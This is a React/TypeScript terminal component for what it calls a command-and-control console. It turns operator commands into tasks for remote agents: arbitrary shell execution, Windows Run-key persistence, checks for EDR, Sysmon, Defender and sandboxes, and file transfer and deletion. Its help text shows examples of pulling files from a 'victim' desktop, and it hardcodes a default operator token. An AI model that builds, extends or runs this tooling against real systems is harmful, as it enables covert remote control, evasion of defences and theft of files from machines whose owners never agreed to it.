import { useEffect, useRef, useState } from "react";
import { Send, Terminal as TermIcon, Trash2 } from "lucide-react";

export type LogEntry = {
  id: string;
  ts: number;
  topic: string;
  agentId?: string;
  content: string;
  type: "info" | "success" | "error" | "warn" | "result";
  riskLevel?: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "CLEAN";
};

type Props = {
  logs: LogEntry[];
  selectedAgent: string | null;
  onSendTask: (plugin: string, action: string, args: Record<string, unknown>) => void;
  onClear: () => void;
};

const COLORS: Record<LogEntry["type"], string> = {
  info: "text-gray-400",
  success: "text-green-400",
  error: "text-red-400",
  warn: "text-yellow-400",
  result: "text-cyan-300",
};

const RISK_STYLES: Record<string, { bg: string; text: string }> = {
  CRITICAL: { bg: "bg-red-950/50 border-l-2 border-red-500", text: "text-red-300" },
  HIGH:     { bg: "bg-orange-950/40 border-l-2 border-orange-500", text: "text-orange-300" },
  MEDIUM:   { bg: "bg-yellow-950/30 border-l-2 border-yellow-600", text: "text-yellow-300" },
  LOW:      { bg: "bg-blue-950/20 border-l-2 border-blue-700", text: "text-blue-300" },
  CLEAN:    { bg: "bg-green-950/20 border-l-2 border-green-600", text: "text-green-300" },
};

function formatTs(ts: number) {
  return new Date(ts * 1000).toLocaleTimeString("en-US", { hour12: false });
}

export function Terminal({ logs, selectedAgent, onSendTask, onClear }: Props) {
  const bottomRef = useRef<HTMLDivElement>(null);
  const [input, setInput] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [histIdx, setHistIdx] = useState(-1);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  /** Parsea "key=value key2=value2" en objeto. Valores sin espacios. */
  function parseKvArgs(str: string): Record<string, unknown> {
    const args: Record<string, unknown> = {};
    const matches = str.matchAll(/(\w+)=([^\s]+)/g);
    for (const m of matches) args[m[1]] = m[2];
    return args;
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const cmd = input.trim();
    if (!cmd || !selectedAgent) return;
    setHistory((h) => [cmd, ...h].slice(0, 50));
    setHistIdx(-1);
    setInput("");

    // Parse: shell <cmd>  |  <plugin> <action> [json]  |  shortcuts
    if (cmd.startsWith("shell ") || cmd.startsWith("sh ")) {
      const shell_cmd = cmd.replace(/^(shell|sh)\s+/, "");
      onSendTask("shell", "exec", { cmd: shell_cmd });
    } else if (cmd === "sysinfo") {
      onSendTask("sysinfo", "summary", {});
    } else if (cmd === "ps") {
      onSendTask("sysinfo", "processes", { limit: 15 });
    } else if (cmd === "netstat") {
      onSendTask("sysinfo", "network", {});
    } else if (cmd === "env") {
      onSendTask("sysinfo", "env", {});
    // ── OPSEC shortcuts ──────────────────────────────────────────────────
    } else if (cmd === "opsec" || cmd === "opsec full") {
      onSendTask("opsec", "full_report", { hours: 2 });
    } else if (cmd === "opsec edr") {
      onSendTask("opsec", "edr_check", {});
    } else if (cmd === "opsec sysmon") {
      onSendTask("opsec", "sysmon_check", {});
    } else if (cmd === "opsec events") {
      onSendTask("opsec", "event_scan", { hours: 4 });
    } else if (cmd === "opsec net") {
      onSendTask("opsec", "net_monitor", {});
    } else if (cmd === "opsec sandbox") {
      onSendTask("opsec", "sandbox_detect", {});
    } else if (cmd === "opsec defender") {
      onSendTask("opsec", "defender_status", {});
    } else if (cmd === "opsec watch") {
      onSendTask("opsec", "watch_start", { interval_seconds: 30 });
    } else if (cmd === "opsec stop") {
      onSendTask("opsec", "watch_stop", {});
    // ── Persist ──────────────────────────────────────────────────────
    } else if (cmd === "persist status") {
      onSendTask("persist", "status", {});
    } else if (cmd.startsWith("persist install")) {
      const rest = cmd.replace(/^persist install\s*/, "");
      onSendTask("persist", "install", parseKvArgs(rest));
    } else if (cmd.startsWith("persist uninstall")) {
      const rest = cmd.replace(/^persist uninstall\s*/, "");
      onSendTask("persist", "uninstall", parseKvArgs(rest));
    // ── FileTransfer ─────────────────────────────────────────────────
    } else if (cmd.startsWith("filetransfer upload")) {
      const rest = cmd.replace(/^filetransfer upload\s*/, "");
      onSendTask("filetransfer", "upload", rest.startsWith("{") ? JSON.parse(rest) : parseKvArgs(rest));
    } else if (cmd.startsWith("filetransfer download")) {
      const rest = cmd.replace(/^filetransfer download\s*/, "");
      onSendTask("filetransfer", "download", rest.startsWith("{") ? JSON.parse(rest) : parseKvArgs(rest));
    } else if (cmd.startsWith("filetransfer list")) {
      const rest = cmd.replace(/^filetransfer list\s*/, "");
      onSendTask("filetransfer", "list", rest ? parseKvArgs(rest) : {});
    } else if (cmd.startsWith("filetransfer checksum")) {
      const rest = cmd.replace(/^filetransfer checksum\s*/, "");
      onSendTask("filetransfer", "checksum", parseKvArgs(rest));
    } else if (cmd.startsWith("filetransfer mkdir")) {
      const rest = cmd.replace(/^filetransfer mkdir\s*/, "");
      onSendTask("filetransfer", "mkdir", parseKvArgs(rest));
    } else if (cmd.startsWith("filetransfer delete")) {
      const rest = cmd.replace(/^filetransfer delete\s*/, "");
      const args = rest.startsWith("{") ? JSON.parse(rest) : parseKvArgs(rest);
      onSendTask("filetransfer", "delete", { ...args, confirm: "true" });
    // ── Workflow ─────────────────────────────────────────────────────
    } else if (cmd.startsWith("workflow ")) {
      const steps = cmd.replace(/^workflow\s+/, "").split("->").map((s) => s.trim());
      const taskSteps = steps.map((s) => {
        if (s === "sysinfo") return { plugin: "sysinfo", action: "summary", args: {} };
        if (s === "ps") return { plugin: "sysinfo", action: "processes", args: { limit: 15 } };
        if (s === "netstat") return { plugin: "sysinfo", action: "network", args: {} };
        if (s === "env") return { plugin: "sysinfo", action: "env", args: {} };
        if (s === "opsec") return { plugin: "opsec", action: "full_report", args: { hours: 2 } };
        if (s === "opsec edr") return { plugin: "opsec", action: "edr_check", args: {} };
        if (s === "opsec sysmon") return { plugin: "opsec", action: "sysmon_check", args: {} };
        if (s === "opsec defender") return { plugin: "opsec", action: "defender_status", args: {} };
        if (s === "opsec net") return { plugin: "opsec", action: "net_monitor", args: {} };
        if (s === "opsec sandbox") return { plugin: "opsec", action: "sandbox_detect", args: {} };
        if (s.startsWith("shell ")) return { plugin: "shell", action: "exec", args: { cmd: s.replace(/^shell\s+/, "") } };
        const p = s.match(/^(\w+)\s+(\w+)(?:\s+(.+))?$/);
        if (p) {
          let a: Record<string, unknown> = {};
          if (p[3]) try { a = JSON.parse(p[3]); } catch { a = { raw: p[3] }; }
          return { plugin: p[1], action: p[2], args: a };
        }
        return { plugin: "shell", action: "exec", args: { cmd: s } };
      });
      fetch(
        `${(window as any).__API_BASE ?? "http://localhost:8000"}/api/agents/${selectedAgent}/workflow`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json", "X-Operator-Token": (window as any).__TOKEN ?? "openc2-dev-token" },
          body: JSON.stringify({ steps: taskSteps }),
        }
      ).catch(() => taskSteps.forEach((t) => onSendTask(t.plugin, t.action, t.args)));
    // ── Snapshot ─────────────────────────────────────────────────────
    } else if (cmd === "snapshot") {
      fetch(
        `${(window as any).__API_BASE ?? "http://localhost:8000"}/api/agents/${selectedAgent}/snapshot`,
        { method: "POST", headers: { "X-Operator-Token": (window as any).__TOKEN ?? "openc2-dev-token" } }
      ).then((r) => r.json()).then((d) => onSendTask("__local__", "snapshot_result", d)).catch(() => {});
    } else if (cmd === "snapshot diff") {
      fetch(
        `${(window as any).__API_BASE ?? "http://localhost:8000"}/api/agents/${selectedAgent}/snapshot/diff`,
        { headers: { "X-Operator-Token": (window as any).__TOKEN ?? "openc2-dev-token" } }
      ).then((r) => r.json()).then((d) => onSendTask("__local__", "diff_result", d)).catch(() => {});
    // ── Doctor ──────────────────────────────────────────────────────
    } else if (cmd === "doctor") {
      fetch(
        `${(window as any).__API_BASE ?? "http://localhost:8000"}/api/doctor`,
        { headers: { "X-Operator-Token": (window as any).__TOKEN ?? "openc2-dev-token" } }
      ).then((r) => r.json()).then((d) => onSendTask("__local__", "doctor_result", d)).catch(() => {});
    // ── Audit ───────────────────────────────────────────────────────
    } else if (cmd === "audit" || cmd === "audit verify") {
      fetch(
        `${(window as any).__API_BASE ?? "http://localhost:8000"}/api/audit/verify`,
        { headers: { "X-Operator-Token": (window as any).__TOKEN ?? "openc2-dev-token" } }
      ).then((r) => r.json()).then((d) => onSendTask("__local__", "audit_result", d)).catch(() => {});
    } else {
      // generic: plugin action {json}
      const parts = cmd.match(/^(\w+)\s+(\w+)(?:\s+(.+))?$/);
      if (parts) {
        const plugin = parts[1];
        const action = parts[2];
        let args: Record<string, unknown> = {};
        if (parts[3]) {
          try { args = JSON.parse(parts[3]); } catch { args = { raw: parts[3] }; }
        }
        onSendTask(plugin, action, args);
      }
    }
  }

  function handleKeyDown(e: React.KeyboardEvent) {
    if (e.key === "ArrowUp") {
      const idx = Math.min(histIdx + 1, history.length - 1);
      setHistIdx(idx);
      setInput(history[idx] ?? "");
    } else if (e.key === "ArrowDown") {
      const idx = Math.max(histIdx - 1, -1);
      setHistIdx(idx);
      setInput(idx === -1 ? "" : history[idx]);
    }
  }

  return (
    <div className="flex flex-col h-full bg-gray-950 rounded-lg border border-gray-800">
      {/* header */}
      <div className="flex items-center justify-between px-3 py-2 border-b border-gray-800">
        <div className="flex items-center gap-2">
          <TermIcon className="w-4 h-4 text-cyan-400" />
          <span className="text-xs text-gray-400 font-mono">
            {selectedAgent
              ? `operator@c2 — agent:${selectedAgent.slice(0, 8)}`
              : "operator@c2 — no agent selected"}
          </span>
        </div>
        <button
          onClick={onClear}
          className="text-gray-600 hover:text-gray-400 transition-colors"
          title="Clear terminal"
        >
          <Trash2 className="w-3.5 h-3.5" />
        </button>
      </div>

      {/* log area */}
      <div className="flex-1 overflow-y-auto p-3 font-mono text-xs space-y-0.5">
        {logs.length === 0 && (
          <div className="text-gray-700 mt-4 text-center space-y-1">
            <div>Select an agent and type a command…</div>
            <div className="text-gray-800">shell whoami · shell ipconfig /all · sysinfo · ps · netstat · env</div>
            <div className="text-gray-800">opsec · opsec edr · opsec sysmon · opsec events · opsec defender · opsec watch</div>
            <div className="text-gray-800">persist status · persist install method=windows_run_key name=MyAgent</div>
            <div className="text-gray-800">filetransfer list path=C:\Users\victim\Desktop · filetransfer upload path=C:\secret.docx</div>
            <div className="text-gray-800">doctor · snapshot · snapshot diff · audit verify</div>
            <div className="text-gray-800">workflow sysinfo -&gt; opsec -&gt; shell whoami</div>
          </div>
        )}
        {logs.map((log) => {
          const risk = log.riskLevel ? RISK_STYLES[log.riskLevel] : null;
          return (
            <div key={log.id} className={`flex gap-2 leading-5 px-1 py-0.5 rounded ${risk ? risk.bg : ""}`}>
              <span className="text-gray-700 shrink-0">{formatTs(log.ts)}</span>
              <span className="shrink-0 text-gray-600">[{log.topic}]</span>
              {log.agentId && (
                <span className="shrink-0 text-cyan-800">{log.agentId.slice(0, 8)}</span>
              )}
              {risk && (
                <span className={`shrink-0 font-bold text-[10px] px-1.5 py-0.5 rounded ${risk.text}`}>
                  {log.riskLevel}
                </span>
              )}
              <span className={`${risk ? risk.text : COLORS[log.type]} whitespace-pre-wrap break-all`}>
                {log.content}
              </span>
            </div>
          );
        })}
        <div ref={bottomRef} />
      </div>

      {/* input */}
      <form
        onSubmit={handleSubmit}
        className="flex items-center gap-2 px-3 py-2 border-t border-gray-800"
      >
        <span className="text-cyan-600 text-xs font-mono shrink-0">
          {selectedAgent ? `[${selectedAgent.slice(0, 8)}]` : "[none]"} $
        </span>
        <input
          type="text"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          onKeyDown={handleKeyDown}
          disabled={!selectedAgent}
          placeholder={selectedAgent ? "shell whoami · sysinfo · opsec · persist status · filetransfer list path=…" : "select an agent first"}
          className="flex-1 bg-transparent text-gray-200 text-xs font-mono outline-none placeholder-gray-700 disabled:opacity-40"
          autoComplete="off"
          spellCheck={false}
        />
        <button
          type="submit"
          disabled={!selectedAgent || !input.trim()}
          className="text-cyan-600 hover:text-cyan-400 disabled:opacity-30 transition-colors"
        >
          <Send className="w-3.5 h-3.5" />
        </button>
      </form>
    </div>
  );
}
